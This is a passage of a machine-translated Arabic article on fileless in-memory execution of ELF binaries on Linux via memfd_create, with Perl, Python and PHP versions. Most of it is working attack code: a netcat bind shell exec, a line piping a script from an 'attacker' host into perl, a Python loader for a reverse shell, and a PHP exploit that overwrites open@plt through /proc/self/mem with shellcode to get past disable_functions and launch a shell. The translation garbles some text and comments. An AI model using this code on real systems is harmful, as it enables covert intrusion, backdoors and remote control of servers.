  exit 0; } #     if (-1 == syscall(112)) { die "setsid: $!"; } #    () $pid = fork(); if (-1 == $pid) { # Error die "fork2: $!"; } if (0 != $pid) { #    exit 0; } #   ""</span></span></code> </pre> <br><p style=";text-align:right;direction:rtl">  ุงูุขู ูููููุง ุชุดุบูู ELF ูู ุงูุนุฏูุฏ ูู ุงูุนูููุงุช. </p><br><h4 id="execve" style=";text-align:right;direction:rtl">  Execve () </h4><br><p style=";text-align:right;direction:rtl">  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Execve ()</a> ูู ุงุณุชุฏุนุงุก ูุธุงู ูุณูุญ ููุง ุจุชูููุฐ ุจุฑูุงูุฌ.  ูููุฑ ููุง Perl ูุธุงุฆู ููุงุซูุฉ ูู ุฎูุงู ูุธููุฉ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Exec ()</a> ุ ุงูุชู ุชุนูู ุชูุงููุง ูุซู ุงุณุชุฏุนุงุก ุงููุธุงู ุงููุฐููุฑ ุฃุนูุงู ุ ูููููุง ุชุญุชูู ุนูู ุจููุฉ ุฃุจุณุท ูุฃูุซุฑ ููุงุกูุฉ. <br>  ูุญุชุงุฌ ุฅูู ุชูุฑูุฑ ุดูุฆูู ุฅูู <code>exec()</code> : ุงูููู ุงูุฐู ูุฑูุฏ ุชูููุฐู (ุฐุงูุฑุฉ ELF ุงูุชู ุชู ุชุญููููุง ุณุงุจููุง) ุ ูุงุณู ุงูุนูููุฉ ูุฃุญุฏ ุงููุณูุทุงุช ุงูุชู ุชู ุชูุฑูุฑูุง.  ุนุงุฏุฉ ูุง ูุชูุงูู ุงุณู ุงูุนูููุฉ ูุน ุงุณู ุงูููู ุงููุงุจู ููุชูููุฐ.  ูููู ุจูุง ุฃููุง ุณูุฑู <code>/proc/PID/fd/3</code> ูู ูุงุฆูุฉ ุงูุนูููุงุช ุ ูุณูู ูุณูู ุนูููุชูุง ุจุดูุก ุขุฎุฑ. <br>  ุจูุงุก ุฌููุฉ <code>exec()</code> ููุง ููู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">exec</span></span> {<span class="hljs-string"><span class="hljs-string">"/proc/$$/fd/$fd"</span></span>} <span class="hljs-string"><span class="hljs-string">"nc"</span></span>, <span class="hljs-string"><span class="hljs-string">"-kvl"</span></span>, <span class="hljs-string"><span class="hljs-string">"4444"</span></span>, <span class="hljs-string"><span class="hljs-string">"-e"</span></span>, <span class="hljs-string"><span class="hljs-string">"/bin/sh"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"exec: $!"</span></span>;</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุจุฏุฃ ุงููุซุงู ุฃุนูุงู Netcat.  ููููุง ูุฑุบุจ ูู ุฅุทูุงู ุดูุก ุฃูู ููููุงู ูุซู ุงูุจุงุจ ุงูุฎููู. <br>  ูู ุชุญุชูู ุนูููุฉ ุงูุชุดุบูู ุนูู ุฑุงุจุท ููููู ุงููุฌููู ูู <code>/proc/PID/fd</code> ุ ูููู ูููููุง ุฏุงุฆููุง ุงูุนุซูุฑ ุนูู ELF ุงูุฎุงุต ุจูุง ุนูู ุงูุฑุงุจุท <code>/proc/PID/exe</code> ุ ุงูุฐู ูุดูุฑ ุฅูู ููู ุนูููุฉ ุงูุชุดุบูู. <br>  ูุฐูู ุฃุทูููุง ELF ูู ุฐุงูุฑุฉ Linux ุ ุฏูู ููุณ ุงููุฑุต ูุญุชู ูุธุงู ุงููููุงุช. <br>  ูู ุงููููู ุชูุฒูู ููููุง ุงููุงุจู ููุชูููุฐ ุฅูู ุงููุธุงู ุงููุณุชูุฏู ุจุณุฑุนุฉ ูุณูููุฉ ุ ุนูู ุณุจูู ุงููุซุงู ุ ูู ุฎูุงู ุชูุฑูุฑ ุจุฑูุงูุฌ ูุตู ุฅูู ูุชุฑุฌู Perl ุ ูุงูุฐู ูุถุนูุง ูู ELF <code>$ curl http://attacker/evil_elf.pl | perl</code> ููุถุนู ุนูู ุงุณุชุถุงูุฉ ููุจ ุฎุงุฑุฌูุฉ: <code>$ curl http://attacker/evil_elf.pl | perl</code> <code>$ curl http://attacker/evil_elf.pl | perl</code> </p><br><h3 id="python" style=";text-align:right;direction:rtl">  ุจูุซูู </h3><br><p style=";text-align:right;direction:rtl">  ุนูู ุบุฑุงุฑ ุฎูุงุฑ Perl ุ ูุญุชุงุฌ ุฅูู ุงูููุงู ุจูุง ููู: </p><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ุจุงุณุชุฎุฏุงู ุงุณุชุฏุนุงุก ุงููุธุงู memfd_create () ุ ูู ุจุฅูุดุงุก ููู ูุฌููู ูู ุงูุฐุงูุฑุฉ </li><li style=";text-align:right;direction:rtl">  ูุชุงุจุฉ ููู ELF ูุงุจู ููุชูููุฐ ููุฐุง ุงูููู </li><li style=";text-align:right;direction:rtl">  ุชูููุฐูุง ูุชูููุฐูุง ุงุฎุชูุงุฑููุง ุนุฏุฉ ูุฑุงุช ุจุงุณุชุฎุฏุงู ุงูุดููุฉ () </li></ul><br><pre style=";text-align:right;direction:rtl"> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> ctypes <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-comment"><span class="hljs-comment">#   .     - binary = open('/tmp/rev-shell','rb').read() fd = ctypes.CDLL(None).syscall(319,"",1) #  memfd_create     final_fd = open('/proc/self/fd/'+str(fd),'wb') #    . final_fd.write(binary) final_fd.close() fork1 = os.fork() #   if 0 != fork1: os._exit(0) ctypes.CDLL(None).syscall(112) #  setsid()     . fork2 = os.fork() #     . if 0 != fork2: os._exit(0) os.execl('/proc/self/fd/'+str(fd),'argv0','argv1') #    .</span></span></code> </pre> <br><p style=";text-align:right;direction:rtl">  ูู ุญุงูุฉ python ุ ูุงุณุชุฏุนุงุก <code>syscall</code> ูุญุชุงุฌ ุฅูู <code>syscall</code> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ูุธุงู ุงูุชุดุบูู</a> ุงูููุงุณูุฉ ููุชุงุจุฉ ุงูููู ูุชูููุฐู ูุงูุชุญูู ูู ุงูุนูููุฉ.  ูู ุดูุก ููุงุซู ุชูุงููุง ูุฅุตุฏุงุฑ ุจูุฑู. <br>  ูู ุงูููุฏ ุฃุนูุงู ุ ููุชุจ ุฅูู ุงูููู ููู ููุฌูุฏ ุณุงุจููุง ูู <code>/tmp/</code> .  ููุน ุฐูู ุ ูุง ุดูุก ูููุนูุง ูู ุชูุฒูู ุงูููู ูู ุฎุงุฏู ุงูููุจ. </p><br><h3 id="php" style=";text-align:right;direction:rtl">  ูุจ </h3><br><p style=";text-align:right;direction:rtl">  ูู ูุฐู ุงููุฑุญูุฉ ุ ูููููุง ุจุงููุนู ุงุณุชุฎุฏุงู perl ู python.  ูุชู ุชุซุจูุช ุงููุชุฑุฌููู ุงูููุฑููู ููุฐู ุงููุบุงุช ุจุดูู ุงูุชุฑุงุถู ุนูู ุงูุนุฏูุฏ ูู ุฃูุธูุฉ ุงูุชุดุบูู.  ููู ุงูุฃูุซุฑ ุฅุซุงุฑุฉ ููุงูุชูุงู ุ ููุง ูู ุงูุญุงู ุฏุงุฆููุง ุ ูู ุงููุณุชูุจู. <br>  ุฅุฐุง ูู ููู ูุชุฑุฌูู ูุบุฉ perl ุฃู python ูุชุงุญูู ูุณุจุจ ูุง ุ ูุณูููู ูู ุงูุฑุงุฆุน ุงุณุชุฎุฏุงู PHP.  ูุฐู ุงููุบุฉ ุชุญุธู ุจุดุนุจูุฉ ูุจูุฑุฉ ุจูู ูุทูุฑู ุงูููุจ.  ูุฅุฐุง ูุฌุฏูุง ุจุงููุนู ุงููุฏุฑุฉ ุนูู ุชูููุฐ ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ูู ุชุทุจูู ููุจ ุ ููู ุงููุญุชูู ุฃู ููุชูู ูุชุฑุฌู PHP ุจูุง. </p><br><p style=";text-align:right;direction:rtl">  ูุณูุก ุงูุญุธ ุ ููุณ ูุฏู php ุขููุงุช <code>syscall</code> ูุงุณุชุฏุนุงุก <code>syscall</code> . <br>  ุตุงุฏููุง ููุดูุฑูุง ูู Beched'a ูู ููุชุฏู rdot (Thanks Beched!) ุ ูุงูุฐู ูุณุชุจุฏู ุงุณุชุฏุนุงุก ุงููุธููุฉ <code>open</code> <code>system</code> ุฎูุงู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">procfs</a> <code>/proc/self/mem</code> ูู ุฐูุฑู ุงูุนูููุฉ ุงูุญุงููุฉ ููุชุฌุงูุฒ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุชุนุทูู</a> ูุธููุฉ. <br>  ุงุณุชุฎุฏููุง ูุฐู ุงูุญููุฉ ูุฅุนุงุฏุฉ ูุชุงุจุฉ ุงููุธููุฉ ุฅูู ุฑูุฒูุง ุ ููุง ุณูุคุฏู ุฅูู ุงุณุชุฏุนุงุกุงุช ุงููุธุงู ุงูุถุฑูุฑูุฉ. <br>  ุณูููู ุจุชูุฑูุฑ syscall ุฅูู ูุชุฑุฌู php ูู ุดูู ููุฏ ูุดุฑุฉ ุนูู ุงููุฌูุน. <br>  ูุฌุจ ุชูุฑูุฑ ููุงููุงุช ุงููุธุงู ุนุจุฑ ุณูุณูุฉ ูู ุงูุฃูุงูุฑ. <br>  ููุจุฏุฃ ุจูุชุงุจุฉ ูุต PHP.  ุงูุชุงูู ุณูููู ุงููุซูุฑ ูู ุงูุณุญุฑ. </p><br><p style=";text-align:right;direction:rtl">  ุฃููุงู ุ ูุดูุฑ ุฅูู ุงููุนุงููุฑ ุงููุงุฒูุฉ: </p><br><pre style=";text-align:right;direction:rtl"> <code class="php hljs"> $elf = file_get_contents(<span class="hljs-string"><span class="hljs-string">"/bin/nc.traditional"</span></span>); <span class="hljs-comment"><span class="hljs-comment">// elf_payload $args = "test -lvvp 31338 -e /bin/bash"; // argv0 argv1 argv2 ...</span></span></code> </pre> <br><p style=";text-align:right;direction:rtl">  ุชุดูุฑ ุฅูู ุงูุชุญูู - ุงูููู ุงูุนููุง ูุงูุณููู ูู ุงูุฐุงูุฑุฉ ุ ุญูุซ ุณูุถุน ูุงุญููุง ููุฏ ุงููุดุฑุฉ ุงูุฎุงุต ุจูุง: </p><br><pre style=";text-align:right;direction:rtl"> <code class="php hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">packlli</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($value)</span></span></span><span class="hljs-function"> </span></span>{ $higher = ($value &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff00000000</span></span>) &gt;&gt; <span class="hljs-number"><span class="hljs-number">32</span></span>; $lower = $value &amp; <span class="hljs-number"><span class="hljs-number">0x00000000ffffffff</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> pack(<span class="hljs-string"><span class="hljs-string">'V2'</span></span>, $lower, $higher); }</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุงูุชุงูู ูู ุงููุธููุฉ ุงูุชู ูุชู ูู ุฎูุงููุง ุชูููู ุงูููู ุงูุซูุงุฆู.  ููููุงู ุจุฐูู ุ ูููู ุจุชุญููู ุงูุจูุงูุงุช ุงูุซูุงุฆูุฉ ุฅูู ุชูุซูู ุนุดุฑู ุจุงุณุชุฎุฏุงู ุงูุฏุงูุฉ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">hexdex () ูู</a> ุงูุจูุงูุงุช ุงูุซูุงุฆูุฉ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">bin2hex ()</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุจุงูุชุฑุชูุจ ุงูุนูุณู</a> (ููุชุฎุฒูู): </p><br><pre style=";text-align:right;direction:rtl"> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">unp</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($value)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> hexdec(bin2hex(strrev($value))); }</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุจุนุฏ ุฐูู ุ ูุชู ุชุญููู ููู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ELF</a> ููุญุตูู ุนูู ุชุนููุถุงุช: </p><br><pre style=";text-align:right;direction:rtl"> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parseelf</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($bin_ver, $rela = false)</span></span></span><span class="hljs-function"> </span></span>{ $bin = file_get_contents($bin_ver); $e_shoff = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x28</span></span>, <span class="hljs-number"><span class="hljs-number">8</span></span>)); $e_shentsize = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3a</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); $e_shnum = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3c</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); $e_shstrndx = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3e</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>($i = <span class="hljs-number"><span class="hljs-number">0</span></span>; $i &lt; $e_shnum; $i += <span class="hljs-number"><span class="hljs-number">1</span></span>) { $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($sh_type == <span class="hljs-number"><span class="hljs-number">11</span></span>) { <span class="hljs-comment"><span class="hljs-comment">// SHT_DYNSYM $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); } elseif(!isset($strtab_off) &amp;&amp; $sh_type == 3) { // SHT_STRTAB $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); } elseif($rela &amp;&amp; $sh_type == 4) { // SHT_RELA $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_ + 24, 8)); $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); } } if($rela) { for($i = $relaplt_off; $i &lt; $relaplt_off + $relaplt_size; $i += $relaplt_entsize) { $r_offset = unp(substr($bin, $i, 8)); $r_info = unp(substr($bin, $i + 8, 8)) &gt;&gt; 32; $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4)); $name = ''; $j = $strtab_off + $name_off - 1; while($bin[++$j] != "\0") { $name .= $bin[$j]; } if($name == 'open') { return $r_offset; } } } else { for($i = $dynsym_off; $i &lt; $dynsym_off + $dynsym_size; $i += $dynsym_entsize) { $name_off = unp(substr($bin, $i, 4)); $name = ''; $j = $strtab_off + $name_off - 1; while($bin[++$j] != "\0") { $name .= $bin[$j]; } if($name == '__libc_system') { $system_offset = unp(substr($bin, $i + 8, 8)); } if($name == '__open') { $open_offset = unp(substr($bin, $i + 8, 8)); } } return array($system_offset, $open_offset); }</span></span></code> </pre> <br><p style=";text-align:right;direction:rtl">  ุจุงูุฅุถุงูุฉ ุฅูู ุฐูู ุ ูููู ุจุนุฑุถ ูุนูููุงุช ุญูู ุงูุฅุตุฏุงุฑ ุงููุซุจุช ูู PHP: </p><br><pre style=";text-align:right;direction:rtl"> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!defined(<span class="hljs-string"><span class="hljs-string">'PHP_VERSION_ID'</span></span>)) { $version = explode(<span class="hljs-string"><span class="hljs-string">'.'</span></span>, PHP_VERSION); define(<span class="hljs-string"><span class="hljs-string">'PHP_VERSION_ID'</span></span>, ($version[<span class="hljs-number"><span class="hljs-number">0</span></span>] * <span class="hljs-number"><span class="hljs-number">10000</span></span> + $version[<span class="hljs-number"><span class="hljs-number">1</span></span>] * <span class="hljs-number"><span class="hljs-number">100</span></span> + $version[<span class="hljs-number"><span class="hljs-number">2</span></span>])); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (PHP_VERSION_ID &lt; <span class="hljs-number"><span class="hljs-number">50207</span></span>) { define(<span class="hljs-string"><span class="hljs-string">'PHP_MAJOR_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">0</span></span>]); define(<span class="hljs-string"><span class="hljs-string">'PHP_MINOR_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">1</span></span>]); define(<span class="hljs-string"><span class="hljs-string">'PHP_RELEASE_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">2</span></span>]); } <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] PHP major version "</span></span> . PHP_MAJOR_VERSION . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุชุญูู ูู ุนูู ุงูุจุช ููุธุงู ุงูุชุดุบูู ูุฅุตุฏุงุฑ ููุงุฉ ููููุณ: </p><br><pre style=";text-align:right;direction:rtl"> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strpos(php_uname(<span class="hljs-string"><span class="hljs-string">'a'</span></span>), <span class="hljs-string"><span class="hljs-string">'x86_64'</span></span>) === <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] This exploit is for x64 Linux. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(substr(php_uname(<span class="hljs-string"><span class="hljs-string">'r'</span></span>), <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>) &lt; <span class="hljs-number"><span class="hljs-number">2.98</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Too old kernel (&lt; 2.98). Might not work\n"</span></span>; }</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูู ุฃุฌู ุงูุชุญุงูู ุนูู ุงููููุฏ ุงูุฎุงุตุฉ <code>disable_functions</code> ุงููุตู ุ ูุนูุฏ ูุชุงุจุฉ ุงูุจุฑูุงูุฌ ุงููุตู ูุธููุฉ <code>open@plt</code> ุนูู ุงูุทุงูุฑ.  ูููุง ุจุนูู ุจุนุถ ุงูุฅุถุงูุงุช ูุดูุฑุฉ ุจูููุฏ ุ ูุงูุขู ูููููุง ูุถุน ููุฏ ุงููุดุฑุฉ ูู ุงูุฐุงูุฑุฉ. </p><br><p style=";text-align:right;direction:rtl">  ุชุญุชุงุฌ ุฃููุงู ุฅูู ุงูุนุซูุฑ ุนูู ุงูุชุบููุฑ ูู ุงูููู ุงูุซูุงุฆู ููุชุฑุฌู PHP ููุณู ุ ูุฐูู ููุชูู ุฅูู <code>/proc/self/exe</code> <code>parseelf()</code> ุงูููู ุงููุงุจู ููุชูููุฐ ุจุงุณุชุฎุฏุงู ูุธููุฉ <code>parseelf()</code> ุงูููุถุญุฉ ุฃุนูุงู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Trying to get open@plt offset in PHP binary\n"</span></span>; $open_php = parseelf(<span class="hljs-string"><span class="hljs-string">'/proc/self/exe'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($open_php == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Failed. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[+] Offset is 0x'</span></span> . dechex($open_php) . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>; $maps = file_get_contents(<span class="hljs-string"><span class="hljs-string">'/proc/self/maps'</span></span>); preg_match(<span class="hljs-string"><span class="hljs-string">'#\s+(/.+libc\-.+)#'</span></span>, $maps, $r); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Libc location: $r[1]\n"</span></span>; preg_match(<span class="hljs-string"><span class="hljs-string">'#\s+(.+\[stack\].*)#'</span></span>, $maps, $m); $stack = hexdec(explode(<span class="hljs-string"><span class="hljs-string">'-'</span></span>, $m[<span class="hljs-number"><span class="hljs-number">1</span></span>])[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Stack location: "</span></span>.dechex($stack).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>; $pie_base = hexdec(explode(<span class="hljs-string"><span class="hljs-string">'-'</span></span>, $maps)[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] PIE base: "</span></span>.dechex($pie_base).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Trying to get open and system symbols from Libc\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">list</span></span>($system_offset, $open_offset) = parseelf($r[<span class="hljs-number"><span class="hljs-number">1</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($system_offset == <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> $open_offset == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Failed. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; }</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุงุจุญุซ ุนู ุนููุงู ุฏุงูุฉ <code>open()</code> : </p><br><pre style=";text-align:right;direction:rtl"> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Got them. Seeking for address in memory\n"</span></span>; $mem = fopen(<span class="hljs-string"><span class="hljs-string">'/proc/self/mem'</span></span>, <span class="hljs-string"><span class="hljs-string">'rb'</span></span>); fseek($mem, ((PHP_MAJOR_VERSION == <span class="hljs-number"><span class="hljs-number">7</span></span>) * $pie_base) + $open_php); $open_addr = unp(fread($mem, <span class="hljs-number"><span class="hljs-number">8</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[INFO] open@plt addr: 0x'</span></span> . dechex($open_addr) . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Rewriting open@plt address\n"</span></span>; $mem = fopen(<span class="hljs-string"><span class="hljs-string">'/proc/self/mem'</span></span>, <span class="hljs-string"><span class="hljs-string">'wb'</span></span>);</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุงูุขู ููููู ุงูุฐูุงุจ ูุจุงุดุฑุฉ ูุชูุฒูู ููููุง ุงููุงุจู ููุชูููุฐ. <br>  ุฃููุงู ุ ูู ุจุฅูุดุงุก ููู ูุฌููู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="php hljs">$shellcode_loc = $pie_base + <span class="hljs-number"><span class="hljs-number">0x100</span></span>; $shellcode=<span class="hljs-string"><span class="hljs-string">"\x48\x31\xD2\x52\x54\x5F\x6A\x01\x5E\x68\x3F\x01\x00\x00\x58\x0F\x05\x5A\xC3"</span></span>; fseek($mem, $shellcode_loc); fwrite($mem, $shellcode); fseek($mem, (PHP_MAJOR_VERSION == <span class="hljs-number"><span class="hljs-number">7</span></span>) * $pie_base + $open_php); fwrite($mem, packlli($shellcode_loc)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Address written. Executing cmd\n"</span></span>; $fp = fopen(<span class="hljs-string"><span class="hljs-string">'fd'</span></span>, <span class="hljs-string"><span class="hljs-string">'w'</span></span>);</code> </pre> <br><p style=";text-align:right;direction:rtl">  ููุชุจ ุงูุญูู ุนูู ููู ูุฌููู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="php hljs">fwrite($fp, $elf);</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุญู ูุจุญุซ ุนู ุฑูู ูุงุตู ุงูููู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="php hljs">$found = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $fds = scandir(<span class="hljs-string"><span class="hljs-string">"/proc/self/fd"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>($fds <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $fd) { $path = <span class="hljs-string"><span class="hljs-string">"/proc/self/fd/$fd"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!is_link($path)) <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strstr(readlink($path), <span class="hljs-string"><span class="hljs-string">"memfd"</span></span>)) { $found = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!$found) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[-] memfd not found'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; }</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุจุนุฏ ุฐูู ุ ููุชุจ ุงููุณุงุฑ ุฅูู ุงูููู ุงููุงุจู ููุชูููุฐ ุนูู ุงูููุฏุณ: </p><br><pre style=";text-align:right;direction:rtl"> <code class="php hljs">fseek($mem, $stack); fwrite($mem, <span class="hljs-string"><span class="hljs-string">"{$path}\x00"</span></span>); $filename_ptr = $stack; $stack += strlen($path) + <span class="hljs-number"><span class="hljs-number">1</span></span>; fseek($mem, $stack);</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุชู ุชูุฑูุฑ ุงูุญุฌุฌ ุงููุทููุจ ุชุดุบูููุง ุฅูู ุงูููู ุงูุชูููุฐู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="php hljs">fwrite($mem, str_replace(<span class="hljs-string"><span class="hljs-string">" "</span></span>, <span class="hljs-string"><span class="hljs-string">"\x00"</span></span>, $args) . <span class="hljs-string"><span class="hljs-string">"\x00"</span></span>); $str_ptr = $stack; $argv_ptr = $arg_ptr = $stack + strlen($args) + <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>(explode(<span class="hljs-string"><span class="hljs-string">' '</span></span>, $args) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $arg) { fseek($mem, $arg_ptr); fwrite($mem, packlli($str_ptr)); $arg_ptr += <span class="hljs-number"><span class="hljs-number">8</span></span>; $str_ptr += strlen($arg) + <span class="hljs-number"><span class="hljs-number">1</span></span>; } fseek($mem, $arg_ptr); fwrite($mem, packlli(<span class="hljs-number"><span class="hljs-number">0x0</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Argv: "</span></span> . $args . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;</code> </pre> <br><p style=";text-align:right;direction:rtl">  